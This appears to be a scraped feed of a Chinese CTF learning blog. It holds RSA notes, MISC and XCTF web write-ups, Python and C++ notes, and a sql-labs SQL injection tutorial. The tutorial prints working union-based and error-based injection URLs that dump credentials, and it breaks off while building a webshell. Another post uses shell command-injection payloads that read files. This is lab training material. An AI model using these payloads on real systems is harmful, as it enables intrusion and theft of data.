RSA算法了解完对称加密和非对称加密后，就来学习一下RSA算法 在了解RSA算法之前，要先了解一下质数和互质数等数学概念，方便更好的理解RSA算法。 质数：一个大于1的自然数，除了1和它本身外，不能被其他自然数整除（除0以外）的数称之为质数(素数)。互质数：公约数只有1的两个数。判断互质数：①任意两个质数一定构成互质数②大数是质数的两个数一定是互质数（如97与88） 欧拉函数：任意给定正整数n，计算在小于等于n的正整数之中，有多少个与n构成互质关系？计算这个值的方法就叫做欧拉函数，以φ(n)表示.（计算互为质数的个数） 123例如：n为10，则与1、3、5、7、9互质，所以φ(n)=5注意这里10不是质数，只算与其互质的。 在RSA算法中，欧拉函数对以下定理成立 如果n可以分解成两个互质的整数之积，即n=p×q,则有φ(n)=φ(pq)=φ(p)φ(q); 根据“大数是质数的两个数一定是互质数”可以知道：一个数如果是质数，则小于它的所有正整数与它都是互质数；所以如果一个数p是质数，则有：φ(p)=p-1 φ(n)=(p-1)(q-1)123456789例如：定理二：n=33,q=3,p=11,n=p*qp、q均为质数，所以只要是小于自己本身的都是互质数，因此才有如下公式φ(p)=(p-1)//(-1)是为了去除本身，得出与其互质的个数φ(q)=(q-1)所以：φ(33)=（3-1）*（11-1）=30 除此之外，还需了解一下欧拉定理与模反元素概念清楚过后，就来梳理一下生成密钥对的流程 随机选择两个不相等的质数p和q，p与q越大则越安全选取p和q 计算p和q的乘积n 计算出n的值 计算n的欧拉函数值，即φ(n)=(p-1)(q-1)计算出φ(n)的值 随机选择一个整数e，条件是1&lt;e&lt;φ(n)，且e与φ(n)互质得出e的值 计算e对φ(n)的模反元素d计算出d的值 将(n,e)封装为公钥，(n,d)封装为私钥n的长度就是密钥长度 公钥 n：质数p和质数q的乘积，e：与φ(n)互质 私钥 n：同公钥n，d m为明文，c为密文参考大佬博客学习了一波，真的是学到知识了。黄映焜的博客园一文搞懂 RSA 算法RSA算法使用介绍RSA算法流程RSA练习 这次就先学习到这里，下次就开始练习RSA题目。","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://bealright.github.io/categories/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"实验吧—(部分)MISC Write up","slug":"实验吧—(部分)MISC Write up","date":"2019-07-12T11:22:21.000Z","updated":"2019-07-12T14:58:59.673Z","comments":true,"path":"2019/07/12/实验吧—(部分)MISC Write up/","link":"","permalink":"http://bealright.github.io/2019/07/12/实验吧—(部分)MISC Write up/","excerpt":"","text":"前言: 杂项题包含密码学也有很大的脑洞，多练习也可以增强自己的脑洞，话不多说，做题吧。 欢迎来到地狱三个文件，从地狱伊始开做，打开后发现图片格式有问题，更改jpg文件头为FF D8即可修复好的图片给了一个链接，下载之后得到一个wav音频文件，听一下是摩斯密码，还是利用工具看看传递的是什么信息。根据形状，敲出摩斯密码长的为-，大点为.，小点为停顿/，即可得出 1-.-/./-.--/.-.././-/..-/.../--./--- 在线摩斯密码解密1K E Y L E T U S G O 打开第二次地狱需要密码，第一次地狱得出的应该就是密码key不是密码，只试后面的就可以了，最后得出小写的为密码1letusgo 打开文档后，一个哈士奇还有提示，图片隐写术这里尝试一些方法。。。都不行，没想到有在线图片隐写解密，还有这种操作。。。在线图片隐写密码即为you are in finally hell now那么第二层就解开了，下面来攻克第三层地狱第三层一个txt一个jpg都是加密的，密码应该就是我们刚才从图片中解出的密码提示是二进制，转化为16进制再转文本，解出来12ruokouling//弱口令 我们再来看加密的图片，用winhex进行分析发现末尾藏有txt文件，binwalk无法分离，用foremost进行分离（也可直接把后缀名改为zip）我们刚才从提示中得到的是弱口令，所以这个加密txt估计要用弱口令字典进行爆破，加载字典，进行爆破（这里得多准备一些字典，有的字典没有这个密码，一开始被困在这很久）得出密码我天，还有。。。来吧，这里按照他们加密小姐姐的顺序反过来解密即可。首先是base64解密，得出1U2FsdGVkX19pDorZ2hTP+5w0zSA9bXhVezJy2umFTSp6PdN6zPKCMA== 中途经历兔子洞穴一开始懵了，查兔子加密。。。，换成英文Rabbit，就比较好查了，很多在线网站凯撒家族凯撒解密第10次解密，即可解出flag，加上提示的格式即可。 九连环一张图片，用winhex观察，发现隐藏有zip，binwalk分离出来。分离出一张图片和一个加密的txt,密码应该是从图片中得出的。这里对图片进行各种操作。。。 结果都不行，实在没思路了看了一下大佬的博客，发现要用到一个隐写工具steghide输入命令，提取出一个ko.txt用密码打开加密的txt即可得出flag FIVE1用winhex观察，发现有zip，binwalk分离，一个加密的图片暴力破解打开图片用winhex观察base64解码摩斯密码解密好用的摩斯解密网站这里被困住了，因为不知道MD5的特征，所以一开始也不知道这是MD5加密后的结果,先来了解一下MD5 MD5是从一段字符串中通过相应特征生成一段32位的数字字母混合码。而且是不可逆，相同数据的MD5值肯定一样，不同数据的MD5值不一样。 MD5解密网站即可得出flag","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"python学习（字符串、整数、列表）","slug":"python学习（字符串、整数、列表）","date":"2019-07-11T11:22:21.000Z","updated":"2019-07-12T13:45:52.598Z","comments":true,"path":"2019/07/11/python学习（字符串、整数、列表）/","link":"","permalink":"http://bealright.github.io/2019/07/11/python学习（字符串、整数、列表）/","excerpt":"","text":"前言：python语言简洁，而且写web题脚本方便，暑假闲着也无聊，不如学习一些知识。 一、字符串修改字符串的大小写python中定义字符串用双引号或单引号都可以python需要提前定义变量，这点和C语言一样，而且python中有方法，方法中包含一些功能，这里我觉得和C++中的成员函数比较相似，就连调用方法也相同，只不过python已经写好了这些功能，我们直接调用即可。 title()方法将字符串首字母大写upper()方法将字符串全变成大写lower()方法_将字符串全变成小写 合并字符串 + 起连接作用 python中合并字符串也很方便，直接一个+号就可以连接前后的字符串。也可以这样表示：总之，python的语法是真的简洁，不需要像C语言一般还需要调用函数来完成合并字符串。 使用制表符和换行符 \\t 制表符\\n 换行符123print(\"\\tpython\")输出结果： python 12345print(\"ss\\ntt\\nll\\n\")输出结果：ssttll 删除空白 rstrip()方法删除字符串末尾的空白123456789&gt;&gt;&gt; language='python '&gt;&gt;&gt; language'python '&gt;&gt;&gt; language.rstrip()'python'&gt;&gt;&gt; language'python '&gt;&gt;&gt; //这样的删除方法删除空白只是暂时的 12345//永久删除空白，必须将删除操作的结果存回到变量中&gt;&gt;&gt; language = 'python '&gt;&gt;&gt; language = language.rstrip()&gt;&gt;&gt; language'python' lstrip()方法删除字符串开头的空白strip()方法同时删除开头和末尾空白 12345&gt;&gt;&gt; language=' python '&gt;&gt;&gt; language.lstrip()'python '&gt;&gt;&gt; language.strip()'python' 二、数字整数 **两个乘号在python表示乘方运算1234&gt;&gt;&gt; 3 ** 29&gt;&gt;&gt; 3 ** 327 python支持次序运算1234&gt;&gt;&gt; 2+3*414&gt;&gt;&gt; (5+1)*318 浮点数 str()函数用来避免类型错误 12345age=23message=\"happy \"+ str(age) +\"rd birthday!\"print(message)//输出结果：happy 23rd birthday! 如果不加str()函数，则会出错，原因是python不知道该如何解读这个值。 注释 在python中用#来注释 1234# 学习pythonprint(\"hello python people!\")//输出结果：hello python people! 在python终端会话中执行命令import this，浏览一下python的指导原则 三、列表 在Python中，用方括号（[] ）来表示列表，并用逗号来分隔其中的元素。 列表与C中的数组较为相似，所以比较好理解。 修改列表元素 在列表添加元素 append（）方法将元素添加到列表末尾 1234567message=['ha','ya','ss']print(message)message.append('wangzixu')print(message)#输出结果：['ha', 'ya', 'ss']['ha', 'ya', 'ss', 'wangzixu'] 在空列表中直接插入元素1234567message=[]message.append('a')message.append('b')message.append('c')print(message)#输入结果：['a', 'b', 'c'] 在列表中插入元素 insert() 方法可在列表的任何位置添加新元素 12345message = ['a','b','c']message.insert(0,'me')print(message)#输出结果:['me', 'a', 'b', 'c'] 从列表中删除元素 使用del语句进行删除1234567message=['a','b','c']print(message)del message[0]print(message)#输入结果：['a', 'b', 'c']['b', 'c'] 使用pop()方法删除列表末尾元素12345678910message= ['a','b','c','d']print(message)pop_message=message.pop()print(message)print(pop_message)#输出结果：['a', 'b', 'c', 'd']['a', 'b', 'c']d#删除的结果会储存到变量pop_message中 12345678910#使用方法pop（）也可以删除指定位置的元素message= ['a','b','c','d']print(message)pop_message=message.pop(1)print(message)print(pop_message)#输出结果：['a', 'b', 'c', 'd']['a', 'c', 'd']b 要从列表中删除一个元素，且不再以任何方式使用它，就使用del 语句；如果要在删除元 素后还能继续使用它，就使用方法pop() 。 根据值删除元素 只知道元素值的话，可以用remove（）删除元素1234567message= ['a','b','c','d']print(message)message.remove('c')print(message)#输出结果：['a', 'b', 'c', 'd']['a', 'b', 'd'] 组织列表 方法sort()能够对列表进行排序，按照字母顺序排序，并且是永久性修改12345message=['k','n','d','a']message.sort()print(message)#输出结果：['a', 'd', 'k', 'n'] 也可以按照字母反序进行排序，只需要在sort（）中加入参数reverse=True12345message=['a','g','d','m']message.sort(reverse=True)print(message)#输出结果：['m', 'g', 'd', 'a'] 函数sorted()对列表进行临时排序，函数sorted() 能够按特定顺序显示列表元素，同时不影响它们在列表中的原始排 列顺序。 12345678message=['k','c','a','d']print(message)print(sorted(message))print(message)#输出结果：['k', 'c', 'a', 'd']['a', 'c', 'd', 'k']['k', 'c', 'a', 'd'] 倒着打印列表 使用方法reverse()反转列表元素的排列顺序,也是永久修改，如果要恢复原来的排列顺序，只需再次调用即可12345678910message=['k','c','a','d']print(message)message.reverse()print(message)message.reverse()print(message)#输出结果：['k', 'c', 'a', 'd']['d', 'a', 'c', 'k']['k', 'c', 'a', 'd'] 确实列表的长度 使用函数len()可获悉列表长度123&gt;&gt;&gt; message = ['a','c','d','d','f']&gt;&gt;&gt; len(message)&gt;5 这次先学习到这里，未完待续。。。。。。","categories":[{"name":"编程语言学习","slug":"编程语言学习","permalink":"http://bealright.github.io/categories/编程语言学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://bealright.github.io/tags/python/"}]},{"title":"XCTF(攻防世界)—新手web题Write Up","slug":"XCTF(攻防世界)—新手web题Write Up","date":"2019-07-10T12:34:24.000Z","updated":"2019-07-24T00:39:40.274Z","comments":true,"path":"2019/07/10/XCTF(攻防世界)—新手web题Write Up/","link":"","permalink":"http://bealright.github.io/2019/07/10/XCTF(攻防世界)—新手web题Write Up/","excerpt":"","text":"前言：之前一直没有接触过web这方面的题，这次利用暑假时光好好学习，web真的是很有趣，虽然有的题很简单，但可以学习到很多知识，话不多说，做题。 view_source用老版火狐浏览器，直接查看源码即可。 get_post利用火狐进行传参，即可得出flag。 robots 做这道题之前，了解一下robots协议，爬虫协议，robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，如果有这个文件，robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 了解robots协议后，做题就好做了，直接访问robots.txt文件。给了一个PHP文件名，访问一下即可得出flag backup不知道，百度百科一下那加上后缀名即http://111.198.29.45:47771/index.php.bak再访问一下，即可得出flag。 cookie用burp抓一下包看看添加后缀名 查看HTTP响应，即可得出flag disabled_button根据提示，将disabled删除即可点出flag webshell一句话，用菜刀进行连接连接成功，即可得出flag simple_php 123456789101112131415 &lt;?phpshow_source(__FILE__);include(\"config.php\");$a=@$_GET['a'];$b=@$_GET['b'];if($a==0 and $a)&#123; echo $flag1;&#125;if(is_numeric($b))&#123; exit();&#125;if($b&gt;1234)&#123; echo $flag2;&#125;?&gt; is_numeric() 函数用于检测变量是否为数字或数字字符串。 代码很好理解，传入对应的参数即可得出flag1http://111.198.29.45:52319/?a=a 即可得出1http://111.198.29.45:52319/?b=1236b 即可得出拼接一下，即可得出flag command_execution（命令执行）做题之前，要先了解一下ping功能，waf等。ping命令的使用方法及功能 WAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。 命令执行详解 常见的命令执行 command1 &amp; command2 ：先执行command2后执行command1command1 &amp;&amp; command2 ：先执行command1后执行command2command1 | command2 ：只执行command2command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2) 除此之外，我们还要了解一些常用的Linux命令。常用 Linux 命令 了解之后，我们便开始做题。首先ping一下本地即127.0.0.1ping通本地后，发现传输三个数据包，接下来就用到我们学到的Linux基本命令查看一下，三个数据包中是否有flag.txt输入命令127.0.0.1 &amp; find / -name flag.txt果然有，再输入命令127.0.0.1 | cat /home/flag.txt查看flag.txt文件，即可得出flag。这里得了解一下cat命令，用来查看文件内容 weak_auth（ 弱身份验证 ）试试最常用的admin 123456组合，竟然爆出了flag，真的是弱口令，不过查了其他方法，用爆破的方法也可以做出了，这里记录一下爆破过程。 先在GitHub上下载弱口令字典，用burpsuite进行爆破用admin作为账号，试试登陆看来账号就是admin，那么就只爆破密码就可以了密码随便输入一个，抓一下包将密码设置为变量载入字典发现到123456时，长度不同，所以密码即为123456，登陆一下即可得出flag xff_referer在此之前，我们需要了解下 xff——伪造IP地址来源格式为：X-Forwarded-For: client1, proxy1, proxy2, proxy3referer——伪造来源浏览器 伪造XFF头绕过服务器IP过滤了解之后，便能够做题了抓包，根据提示修改xff此时页面显示必须来自https://www.google.com根据提示，伪造来源服务器，即可得出flag simple_js打开之后，直接查看源代码，发现一串JS代码 1234567891011121314151617181920function dechiffre(pass_enc)&#123; var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;&#125; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass; &#125; String[\"fromCharCode\"](dechiffre(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\")); h = window.prompt('Enter password'); alert( dechiffre(h) ); 要做这道题就得看懂JS代码表达的意思，首先来了解代码中出现的一些方法 split() 方法用于把一个字符串分割成字符串数组。fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。prompt()方法用于显示可提示用户进行输入的对话框。 了解之后，便可以观察代码了这一部分代码分为两个循环，但是仔细观察的话，第一个循环是将前五个Unicode 值，然后返回一个字符串，写一个简单的python脚本验证下后一个循环功能是一样的，只不过是把后面的Unicode 值，返回成字符串。返回的pass为即不管我们输入什么，最终显示都是这个，所以这个是假的密码，那么真正的密码应该就是十六进制转化为文本字符再用简单的python脚本跑一下，即可得出flag 题虽然不是太难，但是可以学习到很多知识，接下来得快点学习python以写脚本用，方便做题。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"C++学习总结（函数、类与对象）","slug":"C++学习总结（函数、类与对象）","date":"2019-06-19T09:13:24.000Z","updated":"2019-06-19T09:17:05.395Z","comments":true,"path":"2019/06/19/C++学习总结（函数、类与对象）/","link":"","permalink":"http://bealright.github.io/2019/06/19/C++学习总结（函数、类与对象）/","excerpt":"","text":"前言：时间过的好快，转眼一学期就过去了，期末考试也快到了，所以就复习一遍同时也将自己学习的感悟总结下来。前面几章大多与C语言相似，就不总结了。 第三章——函数参数传递123456789101112131415161718192021#include &lt;iostream&gt;using namespace std;void swap(int a,int b) &#123; int t=a; b=t; a=b;&#125;int main()&#123; int x=5,y=10; cout&lt;&lt;\"x= \"&lt;&lt;x&lt;&lt;\" y= \"&lt;&lt;y&lt;&lt;endl; swap(x,y); cout&lt;&lt;\"x= \"&lt;&lt;x&lt;&lt;\" y= \"&lt;&lt;y&lt;&lt;endl; return 0;&#125;//输出结果x= 5 y= 10x= 5 y= 10 通过这个例子，可以看出形参值的改变对实参是无影响的，如果是引用传递的话就另当别论了，看下面这个例子。可以看出，如果使用引用参数的话是可以改变实参的值，但要注意： 声明一个引用时，必须同时对它进行初始化，使它指向一个已经存在的对象 一旦一个引用被初始化后，就不能改为指向其他对象 内敛函数对于内敛函数，我的理解是就相当于一个类中公有类型的成员函数，只不过是放在了类外面，需要在函数返回值类型前加上inline,而且内敛函数大多都是调用频率很高，而且代码是相对简单的。 带默认形参值的函数通过这个代码就会理解带默认形参值的函数，但也有几点要注意： 有默认值的形参必须在形参列表的最后，因为实参与形参是按照从左到右的顺序建立关系的。 在相同的作用域中，不允许在同一个函数的多个声明中对一个参数的默认值重复定义。 函数重载说白了，就是同一个函数名，但又不同的功能，这就叫函数重载，也需注意： 函数重载不以形参名来区分函数 函数重载不以返回值来区分函数 第四章——类与对象 类的定义：class 类名称{ public： 外部接口private：私有成员}；对象声明:类名 对象名;对象访问数据成员:对象名.数据成员名对象调用函数成员:对象名.函数成员名（参数表）成员函数的实现: 返回值类型 类名::函数成员名（参数表） { 函数体 } 例如：123456789void Clock::setTime(int newH,int newM,int newS) &#123; hour=newH; minute=newM; second=newS;&#125;void Clock::showTime() &#123; cout&lt;&lt;huor&lt;&lt;\":\"&lt;&lt;minute&lt;&lt;\":\"&lt;&lt;seconde&lt;&lt;endl;&#125; 到这才算刚接触到C++，这些便是C++访问成员函数或对象的一些方法。 构造函数通过这个代码，感觉构造函数有一般成员函数的特征，但构造函数有一些特殊的特征：构造函数的函数名与类名相同，而且没有返回值 复制构造函数 复制构造函数的一般方法class 类名{ public: 类名（形参名）；//构造函数 类名（类名 &amp;对象名）；//复制构造函数…};类名：：类名（类名 &amp;对象名）；//复制构造函数的实现{函数体} 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;using namespace std;class point &#123;public: point(int xx=0,int yy=0) &#123; x=xx; y=yy; &#125; point(point &amp;p); int getX() &#123;return x;&#125; int getY() &#123;return y;&#125;private: int x,y;&#125;;//成员函数实现point::point(point &amp;p) &#123; x=p.x; y=p.y; cout&lt;&lt;\"copy\"&lt;&lt;endl;&#125;//形参为point类对象的函数void fun1(point p) &#123; cout&lt;&lt;p.getX()&lt;&lt;endl;&#125;//返回值为point类对象的函数point fun2()&#123; point a(1,2); return a;&#125;int main()&#123; point a(4,5); point b=a;//情况一，用a初始化b.第一次调用复制构造函数 cout&lt;&lt;b.getX()&lt;&lt;endl; fun1(b);//情况二，对象b作为fun1的实参。第二次调用复制构造函数 b=fun2();//情况三，函数返回值是类对象，函数返回时，调用复制构造函数 cout&lt;&lt;b.getX()&lt;&lt;endl; return 0;&#125; 通过这个代码来了解一下复制构造函数，复制构造函数拥有一般构造函数的所有特性，而它所不同的是形参是本类的对象的引用。作用是使用一个已经存在的对象（由复制构造函数的参数指定），去初始化同类的一个新对象。这个概念理解起来最好是通过代码，这样便于理解。 复制函数有三种情况可以被调用： 当用类的一个对象去初始化该类的另一个对象时。 如果函数的形参是类的对象，调用函数时，进行形参和实参的结合时。 如果函数的返回值是类的对象，函数执行完成返回调用者时。 析构函数构造对象时，构造函数中分配了资源，动态申请了一些内存单元，在对象消失时需要释放这些内存单元。而析构函数就用来完成对象被删除前的一些清理工作。析构函数是在对象的生产期即将结束的时刻被自动调用的。而且析构函数不接收任何参数。","categories":[{"name":"编程语言学习","slug":"编程语言学习","permalink":"http://bealright.github.io/categories/编程语言学习/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://bealright.github.io/tags/C/"}]},{"title":"Bugku—MISC题总结","slug":"Bugku—MISC题总结","date":"2019-06-15T11:38:24.000Z","updated":"2019-07-19T10:34:28.875Z","comments":true,"path":"2019/06/15/Bugku—MISC题总结/","link":"","permalink":"http://bealright.github.io/2019/06/15/Bugku—MISC题总结/","excerpt":"","text":"前言：MISC考脑洞，也考分析和观察能力，总之比较有趣，就总结一下我的做题过程。 这是一张单纯的图片用winhex打开 Unicode编码转换ASCII即可得出flag 隐写前四位是宽度，后四位是高度。将A4修改位F4即可得出flag telnetwinhex打开就可得出flag 眼见非实(ISCCCTF)下载之后打不开，根据提示眼见非实，将docx文件改成zip文件即可得出flag 啊哒用winhex打开，发现隐藏有zip文件，用binwalk进行分离得到一个加密文本，开始以为是伪加密，但用winhex打开后查看不是伪加密，因为不知道是否含字符、或是几位数，所以暴力破解也是不可取的，回去查看第一张照片，应该还隐藏有信息。果然藏有东西，base16解码即可得出密码sdnisc_2018，打开文本即可得出flag 又一张图片，还单纯吗第一反应便是winhex打开，结果也没有发现什么，用binwalk分离也分离不出来，但确实能看出里面隐藏有文件。这里就需要一个新的工具foremost-master分离工具。输入命令，提取出文件，即可得出flag 123$ foremost -T 2.jpgProcessing: 2.jpg|*| 猜百度识图，直接可以识别是谁，至于flag提示中有 隐写2winhex查看binwalk进行分离分离出一个加密的图片，和一个提示，既然都告诉我们了密码是3个数，直接暴力破解密码为871，即可得出flag 宽带信息泄露一开始各种方法都试过，实在没思路，回去看题目，宽带信息泄露，用文本打开是乱码，说明被加密了，这里就需要一个工具RouterPassView来帮助做题了又提示flag{宽带用户名}，打开工具直接查找username，即可得出flag。 多种方法解决用winhex打开后，发现是base64转图片的格式，在线转图片，即可得出flag 闪的好快得出一个gif二维码，用神器Stegsolve即可得出18张二维码图片，扫码即可得出flag 白哥的鸽子一开始用winhex打开，没有注意到末尾，尝试了其他方法不行才发现末尾的重要信息。这里可以看到flag只是顺序被打乱了，栅栏加密，解密即可得出flagflag需去除两个@ 隐写3这道题要敏感，大白怎么可能光一个头，所以应该是改图片的宽高，即可得出flag这样才可爱 爆照(08067CTF)下载图片，用winhex打开后发现隐藏有zip文件，binwalk进行分离。给了一堆文件，把后缀名改为jpg,看看能显示出什么发现其中一个有二维码，扫出bilibili再看题目提示答案格式我们应该还漏掉有其他答案，再回去查看图片888.jpg发现base64，解密得出silisili应该还有一个在8888.jpg中发现隐藏有图片，binwalk一下即可得出panama按照题目提示拼接成falg即可 神秘的文件flag压缩包中还有一个logo图片明文攻击，把外面的logo图片也压缩进flag压缩包中接下来爆破口令打开word既然找不到flag，把你变成zip格式看看是否隐藏有找到了base64解密即可得出flag 细心的大象细心的大象，要细心，看看照片详细信息隐藏有东西没果然，这个又是base64加密的接下来，把照片binwalk一下，出来一个压缩包，里面一个加密的图片上面base64解密后的密码就是这个照片的密码跟一开始遇到那道题一样，修改宽高即可得出flag 图穷匕见之前做过这种题，打开winhex后发现一堆十六进制，在notepad++打开后转成ascll，再替换成相应的格式即可画图。具体做法这里就不细说了，之前总结的也做过这个题。 这次就先总结到这里，另一部分的题写到下一篇博客中。","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"通过sql-labs进行sql注入学习(一)","slug":"通过sql-labs进行sql注入学习(一)","date":"2019-06-09T12:01:24.000Z","updated":"2019-06-09T13:01:04.019Z","comments":true,"path":"2019/06/09/通过sql-labs进行sql注入学习(一)/","link":"","permalink":"http://bealright.github.io/2019/06/09/通过sql-labs进行sql注入学习(一)/","excerpt":"","text":"SQL注入有很多方法，先接触最简单最直观的一种——联合查询注入 联合查询注入原理联合查询的前提是需要有显示位，而显示位就是通过用户的查询从数据库中返回到页面的数据，是可变化的。 例如：sql-labs前四关都是联合查询注入 sql-labs(一) 输入id=1或id=2，都会返回数据，而且返回的数据不相同。 接下来就开始实战，通过实战来了解联合查询注入的步骤和方法。 一、判断注入点 闭合符号一般是&#39;,&quot;,或无闭合符号或&#39;)，&quot;) --+为注释符号 在url框中输入?id=2&#39;，发现 用--+将后面的字符注释掉，发现 正常显示，说明注入点是单引号。二、判断列数1http://127.0.0.1/sqli-labs-master/Less-1/?id=2' order by 4--+ 发现 一共三列，接下来就开始联合查询。1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,2,3--+ 这里将id等于一个数据库不存在的数，通过联合查询能看出我们输入的数据在哪里能够显示出来。在2，3的位置我们便可插入我们想用的语句了。 三、爆数据库1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,database(),3--+ 通过一个database()函数便可获知当前数据库。四、爆数据表 在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。information_schema.columns包含所有表的字段 table_schema 数据库名 table_name 表名 column_name 列名 information_schema.tables包含所有库的表名 table_schema 数据库名 table_name 表名 information_schema.schemata包含所有数据库的名 schema_name 数据库名 group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 了解之后，才会更明白一些语句为何这样那样构造，接下来就开始查询数据表。1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ 五、爆字段1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+ 也可以1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 六、爆值1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+ 0x3a是:用来区分用户名和密码，不至于混淆。这样，用户名和密码就爆出来了。 sql-labs(二)1http://127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 4--+ 无闭合符号 sql-labs(三)1http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 4--+ 闭合符号为&#39;) sql-labs(四)1http://127.0.0.1/sqli-labs-master/Less-4/?id=1\") order by 4--+ 闭合符号为&quot;)其他步骤与第一关相同，这里就不阐述了。 接下来介绍第二种注入方式——报错注入报错注入原理报错注入是基于没有回显数据，只有报错语句的基础上才使用，例如sql-labs的第五关。这里即使id输入正确，也只会显示一个YOU are in……，但如果输入错误的语句时，会出现报错语句。那思路来了，我们可以故意构造报错语句，其中插入我们想要的语句，这样即使报错了，在语句中也含有我们想要的数据。网上有很多常见的报错注入语句，但是要理解原理，才能更好的使用这些语句。一、Duplicate entry报错报错注入的经典语句：12union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+version()可以替换为需要查询的信息。 简化语句：1union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2));–+ 在使用之前，我们要知道一些函数的作用 Count()计算总数Concat()连接字符串Floor()向下取整数Rand()产生0～1的随机数rand(0)序列是011011group by a 会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组 这里看了很多大佬的博客，搞清楚了Duplicate entry报错的原理。union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+网上最常见的语句就是这个，但为何报错？？ 因为count()和floor(rand(0)2)的位置问题吗？？，其实不是的，这里也就不饶弯子了。其实报错的原因在与rand()函数在查询的时候会执行了一次，而插入的时候又会执行一次，group by 创建的临时表，第一次查询是0，,因为是空表所以插入这条,而插入的时候rand()又执行了一次，再执行一次因为表中已经有数据1，那么新添加的数据相加变成2，这里相当已经执行了三次（但其实是二次），所以011011就又排到0了，到了第三次执行rand()是值为0,因为表中不存在所以要插入新的数据,这次插入rand()再次执行,所以插入的又是1.而表中已经存在1了此时插入因为重复出现同一个key,就会出现报错 重复出现key。所以这也是为何floor(rand(0)*2)报错是有条件的，记录必须3条以上的原因这里我们觉得可以多去看看大佬的博客，他们写的真的非常详细，例如：MYSQL报错注入原理sql注入之报错注入MYSQL常见注入原理懂其原理，便可做题。 sql-labs(五) 首先判断出单引号闭合 利用经典语句 一、爆出数据库 1http://127.0.0.1/sqli-labs-master/Less-5/?id=2' union select 1,2,count(*) from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+ 这里要注意的是报错语句会出现一个1，有时可能弄混淆，所以我们加上0x3a即:来隔开这个1。报错语句中又我们想要的信息，数据库名，接下来就爆表名。二、爆表名1http://127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;--+ 爆出我们想要的表名三、爆字段值1http://127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 1http://127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 爆出了字段 四、爆值1http://127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select username from users limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;--+ 这样就爆出用户名和密码了。 sql-labs(六)1http://127.0.0.1/sqli-labs-master/Less-6/?id=2\" union select 1,2,count(*) from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+ 闭合符号为&quot;其它的步骤与sql-labs(五)相同，一步一步就可以爆出你想要的信息。 通过第七关学到了很多东西，菜刀的使用，而且学到一种注入方法。首先就先首先菜刀的方法，这个贼过瘾。。。之前总看大佬的博客中有一句话，我都不知道是什么意思今天终于搞清楚了一些，就先用第七关来练习一下。第一种方法-使用菜刀一、判断注入点但这时的报错语句已经统一规范成这样了，所以只有挨个试。试出来注入点为1&#39;))二、查列数一共三列三、构造一句话1http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,'&lt;?php 